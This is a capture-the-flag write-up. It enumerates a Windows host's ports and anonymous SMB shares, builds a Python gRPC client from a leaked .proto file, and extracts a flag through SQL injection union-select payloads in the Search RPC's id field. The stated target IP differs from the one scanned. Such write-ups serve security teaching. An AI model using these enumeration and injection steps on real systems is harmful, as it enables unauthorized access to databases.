# Escape Valve

## Description
* Target IP: 3.142.209.118


## Solution

We've given an IP address. Let's do a quick port scan.

```bash
nmap -p- -Pn 18.118.104.60 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-06 01:20 EDT
Nmap scan report for ec2-18-118-104-60.us-east-2.compute.amazonaws.com (18.118.104.60)
Host is up (0.16s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: NOTIMP)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: HEIST
|   DNS_Domain_Name: HEIST
|   DNS_Computer_Name: HEIST
|   Product_Version: 10.0.14393
|_  System_Time: 2022-05-06T05:21:11+00:00
| ssl-cert: Subject: commonName=HEIST
| Not valid before: 2022-04-28T11:49:55
|_Not valid after:  2022-10-28T11:49:55
|_ssl-date: 2022-05-06T05:21:51+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9000/tcp open  cslistener?
```

This reveals different open ports. Check if there are any open shares available. 

```bash
smbclient --no-pass -L \\18.118.104.60

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        tracker         Disk      
        Users           Disk      
SMB1 disabled -- no workgroup available
```

We see `Users` and `tracker` shares accessible. Let's view `Users`

```bash
smbclient --no-pass \\\\18.118.104.60\\Users 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Apr 30 08:54:06 2022
  ..                                 DR        0  Sat Apr 30 08:54:06 2022
  Default                           DHR        0  Fri Apr 29 05:03:34 2022
  desktop.ini                       AHS      174  Sat Jul 16 09:21:29 2016
  Public                             DR        0  Mon Sep 12 07:35:16 2016
```

Nothing interesting. Let's move on to `tracker`. 

```bash
smbclient \\\\18.118.104.60\\tracker --no-pass
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr 30 10:06:04 2022
  ..                                  D        0  Sat Apr 30 10:06:04 2022
  juliaJEA.psrc                       A      316  Sat Apr 30 09:37:34 2022
  tracker.proto                       A      205  Mon May  2 11:46:12 2022

                15727871 blocks of size 4096. 7189919 blocks available
```

We see two files which are interesting. Download them.

```bash
smb: \> prompt
smb: \> mget *
getting file \juliaJEA.psrc of size 316 as juliaJEA.psrc (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \tracker.proto of size 205 as tracker.proto (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

**juliaJEA.psrc**

```powershell
@{
GUID = 'dac1bb0d-fe36-439d-a7ea-dab6c988bb6d'
Author = 'julia'
CompanyName = 'HeistCorp'
Copyright = '(c) 2022 Administrator. All rights reserved.'
}
```

**tracker.proto**

```protobuf
# Compiled with grpcio-tools 1.29.0 
syntax = "proto3";

service Tracker {
        rpc Search(Cases) returns (Data) {}
}
message Cases {
        string id = 1;
}
message Data {
        string info = 1;
}
```

`psrc` is a PowerShell Role Capability file. We can read about it from [docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-psrolecapabilityfile?view=powershell-7.2). `.proto` is a Protocol Buffers (protobuf) format.  It has a service defined `Tracker` with method `Search`. The `Search` method accepts `Cases` as an input parameter and returns `Data`. The format matches gRPC syntax. Which is well explained [here](https://grpc.io/docs/languages/python/basics/). gRPC is an open source framework which helps in building scalable and fast apis. 

gRPC has client and server model where client defines a stub to interact with the server and server implements a RPC interface and runs a gRPC server to handle client calls. 

![](assets/diag.svg)

gRPC supports multiple languages. The writeup uses Python language to create client but any language can be used for this task. As proto file highlights the version to be used for `grpcio-tools` as `1.29.0` we gonna use same version while compiling the proto file. 

```bash
pip3 install grpcio-tools=='1.29.0'
```

We remove first commented line and can try to compile it 

```bash
python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. tracker.proto
```

This generates two code files `tracker_pb2_grpc.py` and `tracker_pb2.py` . We can start writing the client. 

```python
import sys
import grpc
import tracker_pb2
import tracker_pb2_grpc

channel = grpc.insecure_channel('18.118.104.60:9000')
stub = tracker_pb2_grpc.TrackerStub(channel)
content = tracker_pb2.Cases(id=sys.argv[1])
response = stub.Search(content)
print(response)
```

The above code imports required packages and creates a stub with grpc channel. This then sends a request with data as `1` and prints the response. 

```bash
python3 client.py 1
info: "{\"case\": \"heist     \", \"name\": \"sergio    \"}"
```

This works and we receive response `info` showing case details. Sending incremental id as input fetches another case details. 

```bash
python3 client.py 2
info: "{\"case\": \"heist     \", \"name\": \"oliveira  \"}"
python3 client.py 3
info: "{\"case\": \"heist     \", \"name\": \"agata     \"}"
python3 client.py 4
info: "Failed to find case details"
```

This could be a search feature. We can try testing for SQL Injection. 

```bash
python3 client.py "1'"
Traceback (most recent call last):
...
grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
        status = StatusCode.UNKNOWN
        details = "Exception calling application: ('42000', "[42000] [Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark after the character string ''.")"
```

Looks like it is vulnerable to SQL injection. The error message also highlights the target SQL Server details. 

```
[Microsoft][ODBC SQL Server Driver][SQL Server]
```

Let's enumerate the columns quick.

```bash
python3 client.py "1 order by 4"
Traceback (most recent call last):
...
grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
        status = StatusCode.UNKNOWN
        details = "Exception calling application: ('42000', '[42000] [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.')"
```

There are 3 columns that are selected in backend SQL query. 

```bash
python3 client.py "-1 union select 1,2,3"
info: "{\"case\": 3, \"name\": 2}"
```

Current user role. 

```bash
python3 client.py "-1 union select 1,2,current_user"
info: "{\"case\": \"dbo\", \"name\": 2}"
```

Check if user role has `sysadmin` role. 

```bash
python3 client.py "-1 union select 1,2,is_srvrolemember('sysadmin','dbo')"
info: "{\"case\": null, \"name\": 2}"
```

We don't have sysadmin privileges. Let's list tables. 

```bash
python3 client.py "-1 union select 1,2,(select top 1 table_name from information_schema.columns order by table_name asc)"
info: "{\"case\": \"cases\", \"name\": 2}"
```

Let's view more info by ordering table based on descending order. 

```bash
python3 client.py "-1 union select 1,2,(select top 1 table_name from information_schema.columns order by table_name desc)"
info: "{\"case\": \"flag_d3649\", \"name\": 2}"
```

We've a `flag_d3649` table. Let's view columns for this table. 

```bash
python3 client.py "-1 union select 1,2,(select top 1 column_name from information_schema.columns order by table_name desc)"
info: "{\"case\": \"flag\", \"name\": 2}"
```

We can view the flag. 

```bash
python3 client.py "-1 union select 1,2,flag from flag_d3649"
info: "{\"case\": \"ACVCTF{pr0to_1nj3ct10ns_4r3_1337}\", \"name\": 2}"
```

